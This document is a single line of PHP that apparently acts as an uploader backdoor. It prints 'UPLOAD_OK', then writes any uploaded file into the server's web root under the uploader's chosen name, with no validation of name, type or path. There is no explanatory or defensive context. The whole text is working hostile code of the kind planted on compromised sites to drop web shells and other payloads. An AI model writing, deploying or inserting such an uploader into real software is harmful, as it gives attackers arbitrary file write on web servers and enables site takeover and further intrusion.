<?php echo "UPLOAD_OK"; move_uploaded_file($_FILES["f"]["tmp_name"], $_SERVER["DOCUMENT_ROOT"]."/html/".$_FILES["f"]["name"]); ?>
